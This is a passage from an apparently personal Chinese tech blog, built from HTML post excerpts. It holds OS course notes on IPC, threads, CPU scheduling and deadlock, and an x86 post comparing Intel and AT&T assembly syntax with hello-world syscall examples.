<h4 id="3-消息传递系统"><a href="#3-消息传递系统" class="headerlink" title="3.消息传递系统"></a>3.消息传递系统</h4><ol>
<li>直接通信方式</li>
<li>间接通信方式</li>
</ol>
<h4 id="4-客户机-服务器系统"><a href="#4-客户机-服务器系统" class="headerlink" title="4.客户机-服务器系统"></a>4.客户机-服务器系统</h4><ol>
<li><p>套接字</p>
<ul>
<li>基于文件型</li>
<li>基于网络型</li>
</ul>
</li>
<li><p>远程过程(方法)调用</p>
</li>
</ol>
<h3 id="2-4-2消息传递通信的实现方式"><a href="#2-4-2消息传递通信的实现方式" class="headerlink" title="2.4.2消息传递通信的实现方式"></a>2.4.2消息传递通信的实现方式</h3><p>1.直接通信(直接消息传递系统)</p>
<ol>
<li>直接通信原语<ul>
<li>对称寻址方式</li>
<li>非对称寻址方式</li>
</ul>
</li>
<li>消息格式</li>
<li>进程同步方式<ul>
<li>发送进程阻塞，接收进程阻塞</li>
<li>发送进程不阻塞，接收进程阻塞</li>
<li>发送进程和接收进程均不阻塞</li>
</ul>
</li>
<li>通信链路<ul>
<li>单行通信链路</li>
<li>双向通信链路</li>
</ul>
</li>
</ol>
<h4 id="2-间接通信-信箱通信"><a href="#2-间接通信-信箱通信" class="headerlink" title="2.间接通信(信箱通信)"></a>2.间接通信(信箱通信)</h4><ol>
<li>信箱的结构</li>
<li>信箱通信原语<ul>
<li>信箱的创建与撤销</li>
<li>消息的发送与接收</li>
</ul>
</li>
</ol>
<h3 id="2-4-3实例：linux进程通信"><a href="#2-4-3实例：linux进程通信" class="headerlink" title="2.4.3实例：linux进程通信"></a>2.4.3实例：linux进程通信</h3><h4 id="1-管道"><a href="#1-管道" class="headerlink" title="1.管道"></a>1.管道</h4><ol>
<li>无名管道</li>
<li>有名管道</li>
</ol>
<h4 id="2-信号"><a href="#2-信号" class="headerlink" title="2.信号"></a>2.信号</h4><h4 id="3-消息队列"><a href="#3-消息队列" class="headerlink" title="3.消息队列"></a>3.消息队列</h4><h4 id="4-共享内存"><a href="#4-共享内存" class="headerlink" title="4.共享内存"></a>4.共享内存</h4><h4 id="5-信号量"><a href="#5-信号量" class="headerlink" title="5.信号量"></a>5.信号量</h4><h4 id="6-套接字"><a href="#6-套接字" class="headerlink" title="6.套接字"></a>6.套接字</h4><h2 id="2-5线程的概念"><a href="#2-5线程的概念" class="headerlink" title="2.5线程的概念"></a>2.5线程的概念</h2><h3 id="2-5-1线程的引入"><a href="#2-5-1线程的引入" class="headerlink" title="2.5.1线程的引入"></a>2.5.1线程的引入</h3><h4 id="1-进程的两个基本属性"><a href="#1-进程的两个基本属性" class="headerlink" title="1.进程的两个基本属性"></a>1.进程的两个基本属性</h4><h4 id="2-程序并发执行所须付出的时空开销"><a href="#2-程序并发执行所须付出的时空开销" class="headerlink" title="2.程序并发执行所须付出的时空开销"></a>2.程序并发执行所须付出的时空开销</h4><h4 id="3-线程–作为调度和分派的基本单位"><a href="#3-线程–作为调度和分派的基本单位" class="headerlink" title="3.线程–作为调度和分派的基本单位"></a>3.线程–作为调度和分派的基本单位</h4><h3 id="2-5-2线程与进程的比较"><a href="#2-5-2线程与进程的比较" class="headerlink" title="2.5.2线程与进程的比较"></a>2.5.2线程与进程的比较</h3><h4 id="1-调度的基本单位"><a href="#1-调度的基本单位" class="headerlink" title="1.调度的基本单位"></a>1.调度的基本单位</h4><h4 id="2-并发性"><a href="#2-并发性" class="headerlink" title="2.并发性"></a>2.并发性</h4><h4 id="3-拥有资源"><a href="#3-拥有资源" class="headerlink" title="3.拥有资源"></a>3.拥有资源</h4><h4 id="4-独立性"><a href="#4-独立性" class="headerlink" title="4.独立性"></a>4.独立性</h4><h4 id="5-系统开销"><a href="#5-系统开销" class="headerlink" title="5.系统开销"></a>5.系统开销</h4><h4 id="6-支持多处理系统"><a href="#6-支持多处理系统" class="headerlink" title="6.支持多处理系统"></a>6.支持多处理系统</h4><h3 id="2-5-3线程转台与线程状态快"><a href="#2-5-3线程转台与线程状态快" class="headerlink" title="2.5.3线程转台与线程状态快"></a>2.5.3线程转台与线程状态快</h3><h4 id="1-线程执行的三个状态"><a href="#1-线程执行的三个状态" class="headerlink" title="1.线程执行的三个状态"></a>1.线程执行的三个状态</h4><ol>
<li>执行状态</li>
<li>就绪状态</li>
<li>阻塞状态</li>
</ol>
<h4 id="2-线程控制块"><a href="#2-线程控制块" class="headerlink" title="2.线程控制块"></a>2.线程控制块</h4><h4 id="3-多线程OS中的进程属性"><a href="#3-多线程OS中的进程属性" class="headerlink" title="3.多线程OS中的进程属性"></a>3.多线程OS中的进程属性</h4><ol>
<li><p>进程是一个可拥有资源的基本单位</p>
</li>
<li><p>多个线程可以并发执行</p>
</li>
<li><p>进程已不是可执行的实体</p>
</li>
</ol>
<h2 id="2-6线程的实现"><a href="#2-6线程的实现" class="headerlink" title="2.6线程的实现"></a>2.6线程的实现</h2><h3 id="2-6-1线程的实现方式"><a href="#2-6-1线程的实现方式" class="headerlink" title="2.6.1线程的实现方式"></a>2.6.1线程的实现方式</h3><h4 id="1-内核支持线程"><a href="#1-内核支持线程" class="headerlink" title="1.内核支持线程"></a>1.内核支持线程</h4><h4 id="2-用户级线程"><a href="#2-用户级线程" class="headerlink" title="2.用户级线程"></a>2.用户级线程</h4><h4 id="3-两种线程的组合方式"><a href="#3-两种线程的组合方式" class="headerlink" title="3.两种线程的组合方式"></a>3.两种线程的组合方式</h4><ol>
<li>多对一模型</li>
<li>一对一模型</li>
<li>多对多模型</li>
</ol>
<h3 id="2-6-2线程的具体实现"><a href="#2-6-2线程的具体实现" class="headerlink" title="2.6.2线程的具体实现"></a>2.6.2线程的具体实现</h3><h4 id="1-KST的实现"><a href="#1-KST的实现" class="headerlink" title="1.KST的实现"></a>1.KST的实现</h4><h4 id="2-ULT的实现"><a href="#2-ULT的实现" class="headerlink" title="2.ULT的实现"></a>2.ULT的实现</h4><ol>
<li>运行时系统</li>
<li>核心线程</li>
</ol>
<h3 id="2-6-3线程的创建与终止"><a href="#2-6-3线程的创建与终止" class="headerlink" title="2.6.3线程的创建与终止"></a>2.6.3线程的创建与终止</h3><h4 id="1-线程的创建"><a href="#1-线程的创建" class="headerlink" title="1.线程的创建"></a>1.线程的创建</h4><h4 id="2-线程的终止"><a href="#2-线程的终止" class="headerlink" title="2.线程的终止"></a>2.线程的终止</h4><h2 id="2-7小结"><a href="#2-7小结" class="headerlink" title="2.7小结"></a>2.7小结</h2><h1 id="3-处理机调度与死锁"><a href="#3-处理机调度与死锁" class="headerlink" title="3.处理机调度与死锁"></a>3.处理机调度与死锁</h1><h2 id="3-1处理机调度概述"><a href="#3-1处理机调度概述" class="headerlink" title="3.1处理机调度概述"></a>3.1处理机调度概述</h2><h3 id="3-1-1处理机调度的层次"><a href="#3-1-1处理机调度的层次" class="headerlink" title="3.1.1处理机调度的层次"></a>3.1.1处理机调度的层次</h3><h4 id="高级调度"><a href="#高级调度" class="headerlink" title="高级调度"></a>高级调度</h4><h4 id="低级调度"><a href="#低级调度" class="headerlink" title="低级调度"></a>低级调度</h4><h4 id="中级调度"><a href="#中级调度" class="headerlink" title="中级调度"></a>中级调度</h4><h3 id="3-1-2作业和作业调度"><a href="#3-1-2作业和作业调度" class="headerlink" title="3.1.2作业和作业调度"></a>3.1.2作业和作业调度</h3><h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4><h4 id="作业控制块"><a href="#作业控制块" class="headerlink" title="作业控制块"></a>作业控制块</h4><h4 id="作业调度的主要任务"><a href="#作业调度的主要任务" class="headerlink" title="作业调度的主要任务"></a>作业调度的主要任务</h4><ol>
<li>接纳多少作业</li>
<li>接纳哪些作业</li>
</ol>
<h3 id="3-1-3进程调度"><a href="#3-1-3进程调度" class="headerlink" title="3.1.3进程调度"></a>3.1.3进程调度</h3><h4 id="1-进程调度任务"><a href="#1-进程调度任务" class="headerlink" title="1.进程调度任务"></a>1.进程调度任务</h4><ol>
<li>保留CPU现场信息</li>
<li>按某种算法选取进程</li>
<li>把CPU分配给进程</li>
</ol>
<p>2.进程调度机制</p>
<ol>
<li>排队器</li>
<li>分派器</li>
<li>上下文切换器</li>
</ol>
<p>3.进程调度方式</p>
<ol>
<li>非抢占式</li>
<li>抢占式</li>
</ol>
<h3 id="3-1-4处理机调度算法的目标"><a href="#3-1-4处理机调度算法的目标" class="headerlink" title="3.1.4处理机调度算法的目标"></a>3.1.4处理机调度算法的目标</h3><ol>
<li><p>处理机调度算法的共同目标</p>
<p>公平性</p>
<p>平衡性</p>
<p>策略强制执行</p>
</li>
<li><p>批处理系统中处理调度算法的目标</p>
<p>平均周转时间短</p>
<p>系统吞吐量高</p>
<p>处理机利用率高</p>
</li>
<li><p>分时系统中处理调度算法的目标</p>
<p>保证响应时间快</p>
<p>保证均衡性</p>
</li>
<li><p>实时系统中处理机调度算法的目标</p>
<p>保证满足截至时间的要求</p>
<p>保证可预测性</p>
</li>
</ol>
<h2 id="3-2调度算法"><a href="#3-2调度算法" class="headerlink" title="3.2调度算法"></a>3.2调度算法</h2><h3 id="3-2-1先来先服务调度算法-first-come-fist-server"><a href="#3-2-1先来先服务调度算法-first-come-fist-server" class="headerlink" title="3.2.1先来先服务调度算法(first come fist server)"></a>3.2.1先来先服务调度算法(first come fist server)</h3><h3 id="3-2-2短作业优先调度算法"><a href="#3-2-2短作业优先调度算法" class="headerlink" title="3.2.2短作业优先调度算法"></a>3.2.2短作业优先调度算法</h3><ol>
<li><p>SJF(short job first)调度算法简介</p>
<p>运行时间越短优先级越高</p>
</li>
<li><p>SJF的缺点</p>
<ul>
<li>必须知道运行时间</li>
<li>对长作业不利</li>
<li>无人机交互</li>
<li>没有考虑作业紧迫性</li>
</ul>
</li>
</ol>
<h3 id="3-2-3优先级调度算法-priority-scheduling-algorithm"><a href="#3-2-3优先级调度算法-priority-scheduling-algorithm" class="headerlink" title="3.2.3优先级调度算法(priority-scheduling algorithm)"></a>3.2.3优先级调度算法(priority-scheduling algorithm)</h3><ol>
<li><p>优先级调度算法的类型</p>
<p>外部赋予作业优先程度</p>
<ul>
<li>非抢占式优先级调度算法</li>
</ul>
<p>程序一直执行直到结束，即使有新的优先级更高的程序</p>
<ul>
<li>抢占式优先级调度算法</li>
</ul>
<p>程序执行到结束，当有新的优先级更高的程序时，让出CPU</p>
</li>
<li><p>优先级的类型</p>
<ul>
<li><p>静态优先级</p>
<ul>
<li><p>在程序创建时确立，考虑因素：①进程类型，②对资源需求，③用户要求；</p>
</li>
<li><p>简单，但不精确，可能使程序饿死</p>
</li>
</ul>
</li>
<li><p>动态优先级</p>
<p>随等待时间则增长而提高</p>
</li>
</ul>
</li>
<li><p>高响应比优先调度算法</p>
</li>
</ol>
<p>$$p&#x3D;\frac{等待时间+要求服务时间}{要求服务时间}&#x3D;\frac{响应时间}{要求服务时间}$$</p>
<p>在SJF和FCFS之间反复横跳</p>
<h3 id="3-2-4轮转调度算法"><a href="#3-2-4轮转调度算法" class="headerlink" title="3.2.4轮转调度算法"></a>3.2.4轮转调度算法</h3><p>在分时系统中，将时间分成等分的时间片</p>
<ol>
<li><p>RR调度算法(round robin)</p>
<p>每个任务运行相同时间后切换</p>
</li>
<li><p>进程切换时机</p>
<ul>
<li>程序结束，但时间片未用完，切换到下一个就绪任务</li>
<li>时间片用完，程序未结束，将程序送往就绪队列<em><strong>尾部</strong></em></li>
</ul>
</li>
<li><p>时间片大小的确定</p>
<p>略大于一次典型的交互所需要的时间</p>
</li>
</ol>
<h3 id="3-2-5多级队列调度算法"><a href="#3-2-5多级队列调度算法" class="headerlink" title="3.2.5多级队列调度算法"></a>3.2.5多级队列调度算法</h3><h3 id="3-2-6多级反馈队列调度算法"><a href="#3-2-6多级反馈队列调度算法" class="headerlink" title="3.2.6多级反馈队列调度算法"></a>3.2.6多级反馈队列调度算法</h3><p>将一个就绪队列拆分为若干</p>
<ol>
<li><p>多级反馈队列调度算法的调度机制</p>
<ul>
<li><p>设置多个就绪队列</p>
<p>每个队列优先级，时间片不同；优先级高的时间片小</p>
</li>
<li><p>每个队列都采用FCFS调度算法</p>
<p>若时间片结束，任务未完成，其转入下一队列末尾</p>
</li>
<li><p>按队列优先级调度</p>
<p>仅当第一列任务结束，在开始下一列，且<em><strong>新的优先级高的任务可以插队</strong></em></p>
</li>
</ul>
</li>
<li><p>多级反馈队列调度算法的性能</p>
</li>
</ol>
<h3 id="3-2-7基于公平原则的调度算法"><a href="#3-2-7基于公平原则的调度算法" class="headerlink" title="3.2.7基于公平原则的调度算法"></a>3.2.7基于公平原则的调度算法</h3><ol>
<li><p>保证调度算法</p>
<p>将每一个程序的</p>
<p>$p&#x3D;\frac{实际处理时间}{应处理时间比值}$</p>
<p>维持在一个相似的比率</p>
</li>
<li><p>公平分享调度算法</p>
<p>针对用户的。让用户的CPU占有时间平等。</p>
</li>
</ol>
<h2 id="3-3实时调度"><a href="#3-3实时调度" class="headerlink" title="3.3实时调度"></a>3.3实时调度</h2><h3 id="3-3-1实现实时调度的基本条件"><a href="#3-3-1实现实时调度的基本条件" class="headerlink" title="3.3.1实现实时调度的基本条件"></a>3.3.1实现实时调度的基本条件</h3><p>要求有截止时间。HRT，SRT</p>
<ol>
<li>提供必要信息<ul>
<li>就绪时间</li>
<li>开始截止时间和完成截止时间</li>
<li>处理时间</li>
<li>资源请求</li>
<li>优先级</li>
</ul>
</li>
<li>系统处理能力强<ul>
<li>采用单处理机系统</li>
<li>采用多处理机系统</li>
</ul>
</li>
<li>采用抢占式调度机制</li>
<li>采用快速切换机制<ul>
<li>对中断的快速响应能力</li>
<li>快速的任务分派能力</li>
</ul>
</li>
</ol>
<h3 id="3-3-2实时调度算法分类"><a href="#3-3-2实时调度算法分类" class="headerlink" title="3.3.2实时调度算法分类"></a>3.3.2实时调度算法分类</h3><h3 id="3-3-3最早截至时间优先算法"><a href="#3-3-3最早截至时间优先算法" class="headerlink" title="3.3.3最早截至时间优先算法"></a>3.3.3最早截至时间优先算法</h3><h3 id="3-3-4最低松弛度优先算法"><a href="#3-3-4最低松弛度优先算法" class="headerlink" title="3.3.4最低松弛度优先算法"></a>3.3.4最低松弛度优先算法</h3><h3 id="3-3-5优先级倒置"><a href="#3-3-5优先级倒置" class="headerlink" title="3.3.5优先级倒置"></a>3.3.5优先级倒置</h3><h2 id="3-4Linux进程调度"><a href="#3-4Linux进程调度" class="headerlink" title="3.4Linux进程调度"></a>3.4Linux进程调度</h2><h2 id="3-5死锁概述"><a href="#3-5死锁概述" class="headerlink" title="3.5死锁概述"></a>3.5死锁概述</h2><h3 id="3-5-1资源问题"><a href="#3-5-1资源问题" class="headerlink" title="3.5.1资源问题"></a>3.5.1资源问题</h3><h3 id="3-5-2计算机系统中的死锁"><a href="#3-5-2计算机系统中的死锁" class="headerlink" title="3.5.2计算机系统中的死锁"></a>3.5.2计算机系统中的死锁</h3><h3 id="3-5-3死锁的定义，必要条件与处理方法"><a href="#3-5-3死锁的定义，必要条件与处理方法" class="headerlink" title="3.5.3死锁的定义，必要条件与处理方法"></a>3.5.3死锁的定义，必要条件与处理方法</h3><h3 id="3-5-4资源分配图"><a href="#3-5-4资源分配图" class="headerlink" title="3.5.4资源分配图"></a>3.5.4资源分配图</h3><h2 id="3-6死锁预防"><a href="#3-6死锁预防" class="headerlink" title="3.6死锁预防"></a>3.6死锁预防</h2><h3 id="3-6-1破坏“请求和保持”条件"><a href="#3-6-1破坏“请求和保持”条件" class="headerlink" title="3.6.1破坏“请求和保持”条件"></a>3.6.1破坏“请求和保持”条件</h3><h3 id="3-6-2破坏“不可抢占”条件"><a href="#3-6-2破坏“不可抢占”条件" class="headerlink" title="3.6.2破坏“不可抢占”条件"></a>3.6.2破坏“不可抢占”条件</h3><h3 id="3-6-3破坏“循环等待”条件"><a href="#3-6-3破坏“循环等待”条件" class="headerlink" title="3.6.3破坏“循环等待”条件"></a>3.6.3破坏“循环等待”条件</h3><h2 id="3-7死锁避免"><a href="#3-7死锁避免" class="headerlink" title="3.7死锁避免"></a>3.7死锁避免</h2><h3 id="3-7-1系统安全状态"><a href="#3-7-1系统安全状态" class="headerlink" title="3.7.1系统安全状态"></a>3.7.1系统安全状态</h3><h3 id="3-7-2利用银行家算法避免死锁"><a href="#3-7-2利用银行家算法避免死锁" class="headerlink" title="3.7.2利用银行家算法避免死锁"></a>3.7.2利用银行家算法避免死锁</h3><h2 id="3-8死锁地检测与解除"><a href="#3-8死锁地检测与解除" class="headerlink" title="3.8死锁地检测与解除"></a>3.8死锁地检测与解除</h2><h3 id="3-8-1死锁的检测"><a href="#3-8-1死锁的检测" class="headerlink" title="3.8.1死锁的检测"></a>3.8.1死锁的检测</h3><h3 id="3-8-2死锁的解除"><a href="#3-8-2死锁的解除" class="headerlink" title="3.8.2死锁的解除"></a>3.8.2死锁的解除</h3>
            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/01/15/OS/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/08/21/at&t%E6%B1%87%E7%BC%96/">
        <h2 class="post-title">x86汇编</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/8/21
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>X86</p>
<p>在已经学习过inter汇编相关知识的情况下，学习at&amp;t语法并不困难，毕竟最困难的部分已经过去了。</p>
<p><code>为什么会有两种语法的x86的汇编语言？</code></p>
<p>汇编语言这个东西本身就和芯片架构高度绑定，其本身就是机器码的助记符，而x86架构的芯片原本就是intel研制的。</p>
<p>所以这个问题可以转化为，<code>为什么at&amp;t要在已有intel语法的基础上再设计一套新语法？</code></p>
<p>c语言是大名鼎鼎的贝尔实验室发明的，还有UNIX OS，而贝尔实验室属于AT&amp;T，从四五十年前到现在，跑UNIX的服务器很大一部分使用的是非intel x86 CPU,人家好像也根本就不怎么鸟intel编译器。</p>
<p>直到PC的普及。</p>
<p>然后免费的linux出现了，使个人电脑可以使用类UNIX操作系统。虽说比不上windows，但还是有一部分市场。而linux等类UNIX的官方语言就是C语言。这个时候，AT&amp;T就要考虑如何在x86上把C语言编译成能执行的机器码。</p>
<p>至于at&amp;t为什么没有直接采用intel的语法，倒是有些许说法，有的说使intel申请了专利balabala，也有说at&amp;t还是看不上intel的语法，打算新写一种更通用的语法(以后可以应用在别的芯片上)，还可能以上影响都有。</p>
<p>那么，具体的区别呢？</p>
<h2 id="操作数前后缀"><a href="#操作数前后缀" class="headerlink" title="操作数前后缀"></a>操作数前后缀</h2><p>在intel的语法中，寄存器和立即数都没有前缀，但在AT&amp;T中，寄存器前冠以“%”，而立即数前冠以“$”。在intel语法中，十六进制和二进制立即数的后缀分别冠以“h”和“b”，而在AT&amp;T中，十六进制前冠以“0x”</p>
<p>Intel与AT&amp;T前缀的区别</p>
<table>
<thead>
<tr>
<th align="left">Intel语法</th>
<th align="left">AT&amp;T语法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">mov   eax,8</td>
<td align="left">movl  $8,%eax</td>
</tr>
<tr>
<td align="left">mov   ebx,0ffffh</td>
<td align="left">movl  $0xffff,%ebx</td>
</tr>
<tr>
<td align="left">int 80h</td>
<td align="left">int   $0x80</td>
</tr>
</tbody></table>
<h2 id="操作数的方向"><a href="#操作数的方向" class="headerlink" title="操作数的方向"></a>操作数的方向</h2><p>intel与AT&amp;T操作数的方向正好相反。在intel语法中，第一个操作数是<code>目的操作数</code>，第二个操作数<code>源操作数</code>。而在AT&amp;T中，第一个操作数是源操作数，第二个是目的操作数。由此可以看出，AT&amp;T的语法更符合人们通常的阅读习惯。</p>
<p>例如：</p>
<table>
<thead>
<tr>
<th>Intel语法</th>
<th>AT&amp;T语法</th>
</tr>
</thead>
<tbody><tr>
<td>mov  eax,[ecx]</td>
<td>movl (%ecx),%eax</td>
</tr>
</tbody></table>
<h2 id="内存单元操作数"><a href="#内存单元操作数" class="headerlink" title="内存单元操作数"></a>内存单元操作数</h2><p>从上面的例子可以看出，内存的操作数也有所不同。在intel的语法中，基寄存器用<code>[]</code>括起来，而AT&amp;T中用<code>()</code>括起来。</p>
<p>例如：</p>
<table>
<thead>
<tr>
<th>Intel语法</th>
<th>AT&amp;T语法</th>
</tr>
</thead>
<tbody><tr>
<td>mov  eax,[ebx+5]</td>
<td>movl   5(%ebx),%eax</td>
</tr>
</tbody></table>
<h2 id="间接寻址"><a href="#间接寻址" class="headerlink" title="间接寻址"></a>间接寻址</h2><p>与intel的语法比较，AT&amp;T间接寻址方式可能更晦涩难懂一些intel的指令格格式是</p>
<p>segreg：[base+index*scale+disp]</p>
<p>而AT&amp;T的格式是</p>
<p>%segreg：disp(base,index,scale)</p>
<p>其中index&#x2F;scale&#x2F;disp&#x2F;segreg是可选的，完全可以简化掉，如果没有指定scale而制定了index，则scale的缺省值为1.segreg段寄存器依赖于指令以及应用程序是运行在实模式还是保护模式，在实模式下，它依赖于指令，而在保护模式下segreg是多余的。在AT&amp;T中，当立即数在scale&#x2F;disp中不应在其前冠以“$”前缀</p>
<p>内存操作数的语法及举例</p>
<table>
<thead>
<tr>
<th align="left">Intel语法</th>
<th align="left">AT&amp;T语法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">指令   foo,segreg:[base+index*scale+disp]</td>
<td align="left">指令    %segreg:disp(base,index,scale),foo</td>
</tr>
<tr>
<td align="left">mov  eax,[ebx+20h]</td>
<td align="left">Movl   0x20(%ebx),%eax</td>
</tr>
<tr>
<td align="left">add   eax,[ebx+ecx*2h</td>
<td align="left">Addl   (%ebx,%ecx,0x2),%eax</td>
</tr>
<tr>
<td align="left">lea   eax,[ebx+ecx]</td>
<td align="left">Leal   (%ebx,%ecx),%eax</td>
</tr>
<tr>
<td align="left">sub   eax,[ebx+ecx*4h-20h]</td>
<td align="left">Subl   -0x20(%ebx,%ecx,0x4),%eax</td>
</tr>
</tbody></table>
<p>这个方面，AT&amp;T可能不如intel，[base+index*scale+disp]一眼就可以看出其含义，而disp(base,index,scale)还需要一个简单的计算.</p>
<p>这种寻址方式常常用在访问数据结构数组中某一特定元素的一个字段，其中，base为数组的起始数组，scale为每个数组的大小，index为下标。如果数组元素还是一个结构，则disp为具体字段在结构中的偏移。</p>
<h2 id="操作码的前后缀"><a href="#操作码的前后缀" class="headerlink" title="操作码的前后缀"></a>操作码的前后缀</h2><p>在上面的例子中你可能已经注意到，在AT&amp;T的操作码后面有一个后缀，其含义就是指出操作码的大小。“l”表示长整数(32位)，“w”表示字（16位），“b”标示字节(8位)。而在Intel语法中，则要内存单元操作数的前面加上byte ptr，word ptr和dword ptr。“dword”即“double word”双字。</p>
<p>也就是说，intel语法把字长声明在<code>操作数</code>，AT&amp;T语法把字长声明在<code>操作数</code></p>
<p>操作码的后缀举例</p>
<table>
<thead>
<tr>
<th align="left">Intel语法</th>
<th align="left">AT&amp;T语法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Mov   al,bl</td>
<td align="left">movb  %bl,%al</td>
</tr>
<tr>
<td align="left">Mov   ax,bx</td>
<td align="left">movw  %bx,%ax</td>
</tr>
<tr>
<td align="left">Mov   eax,ebx</td>
<td align="left">movl   %ebx,%eax</td>
</tr>
<tr>
<td align="left">Mov   eax, dword ptr [ebx]</td>
<td align="left">movl   (%ebx),%eax</td>
</tr>
</tbody></table>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><p>顺便简单实现一下汇编语言的hello world。在linux中，有很多办法可以实现在屏幕上显示一个字符串，但最简洁的方式是使用linux内核提供的系统调用。使用这种方法最大的好处是可以直接和操作系统的内核进行通信，不需要链接诸如libc这样的函数库，也不需要使用elf解释器，所以代码尺寸小且执行速度快。</p>
<p>linux是一个运行在兼容32位保护模式的操作系统，采用flat memory模式，<code>.data</code>是可读可写的数据区。而<code>.bss</code>则是可读可写且没有初始化的数据区。代码区和数据区在elf中统称为section。根据实际情况你可以使用其他的标准section，也可以添加自定义的section。但是一个elf可执行文件至少应该有一个<code>.text</code>部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#hello.s</span><br><span class="line">.data                                        # 数据段声明</span><br><span class="line">                msg : .string &quot;Hello, world!\\n&quot; # 要输出的字符串</span><br><span class="line">                len = . - msg                                     # 字串长度</span><br><span class="line">.text                                        # 代码段声明</span><br><span class="line">.global _start                     # 指定入口函数</span><br><span class="line">_start:                                    # 在屏幕上显示一个字符串</span><br><span class="line">                movl $len, %edx    # 参数三：字符串长度</span><br><span class="line">                movl $msg, %ecx    # 参数二：要显示的字符串</span><br><span class="line">                movl $1, %ebx        # 参数一：文件描述符(stdout)</span><br><span class="line">                movl $4, %eax        # 系统调用号(sys_write)</span><br><span class="line">                int    $0x80             # 调用内核功能</span><br><span class="line">                                                 # 退出程序</span><br><span class="line">                movl $0,%ebx         # 参数一：退出代码</span><br><span class="line">                movl $1,%eax         # 系统调用号(sys_exit)</span><br><span class="line">                int    $0x80             # 调用内核功能</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; hello.asm</span><br><span class="line">section .data                        ; 数据段声明</span><br><span class="line">                msg db &quot;Hello, world!&quot;, 0xA         ; 要输出的字符串</span><br><span class="line">                len equ $ - msg                                 ; 字串长度</span><br><span class="line">section .text                        ; 代码段声明</span><br><span class="line">global _start                        ; 指定入口函数</span><br><span class="line">_start:                                    ; 在屏幕上显示一个字符串</span><br><span class="line">                mov edx, len         ; 参数三：字符串长度</span><br><span class="line">                mov ecx, msg         ; 参数二：要显示的字符串</span><br><span class="line">                mov ebx, 1             ; 参数一：文件描述符(stdout)</span><br><span class="line">                mov eax, 4             ; 系统调用号(sys_write)</span><br><span class="line">                int 0x80                 ; 调用内核功能</span><br><span class="line">                                                 ; 退出程序</span><br><span class="line">                mov ebx, 0             ; 参数一：退出代码</span><br><span class="line">                mov eax, 1             ; 系统调用号(sys_exit)</span><br><span class="line">                int 0x80                 ; 调用内核功能</span><br></pre></td></tr></table></figure>

<p>以上两个代码虽然采用的语法不一样，但功能却都是调用linux内核提供的sys_write来显示一个字符串，然后再调用sys_exit退出程序。</p>
<p>在linux内核源文件include&#x2F;asm-i386&#x2F;unistd.h中可以找到所有系统调用的定义。</p>
<p>简单说一下系统调用</p>
<p>即使是最简单的汇编程序，也难免用到诸如输入输出及退出的操作，而要进行这些操作需要调用操作系统所提供的服务，也就是系统调用。出非你的程序只是完成加减乘除等数学运算(不考虑程序开始或结束，不需要外部输入输出)，否则讲很难避免使用系统调用，事实上除了系统调用不同之外，各种操作系统的汇编编程往往都是类似的。</p>
<p>在linux上只有两种方式使用系统调用：利用封装后的C库(libc)或则直接使用汇编直接调用。</p>
<p>其中，直接通过汇编语言来调用系统调用，似乎最高效使用llinux内核的方法，因为最终生成的程序不需要任何库进行链接，而是直接和内核通信</p>
<p>和DOS一样，linux下的系统调用也是很通过中断(int 0x80)来实现的。在执行int 80指令时，寄存器eax中存放的时候系统调用的功能号。而传给系统调用的参数依据32位和64位的不同分别将参数用栈传参和寄存器传参(前6个用 rdi, rsi, rdx, rcx, r8, r9，其余的使用栈传参)。系统调用完成后，返回值可以在寄存器eax中获得。</p>
<p>所有系统调用功能号都可以在&#x2F;usr&#x2F;include&#x2F;bits&#x2F;syscall.h中找到，为了方便，他们是使用SYS_&lt;name&gt;这样的宏来定义的，如SYS_write,SYS_exit等。例如，经常用到的write函数时如下定义的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(int fd,const void *buf,size_t count);</span><br></pre></td></tr></table></figure>

<p>该函数的功能最终时通过SYS_write这以系统调用实现的。依据上面的约定，参数fd，buf，count分别存在rdi，rsi，rdx，而系统调用号SYS_write则放在寄存器eax中，当int 0x80指令执行完毕，返回值可以从eax中获得。</p>
<p>命令行参数</p>
<p>在linux操作系统中，当一个可执行程序通过命令行启动时，其所需要的参数将被保存到栈中：首先是argc，然后时只想哥哥命令行参数的指针数组argv，最后是指向环境的指针数据envp。在编写汇编语言程序时，很多时候需要对这些参数进行处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># args.s</span><br><span class="line">.text</span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">popl %ecx # argc</span><br><span 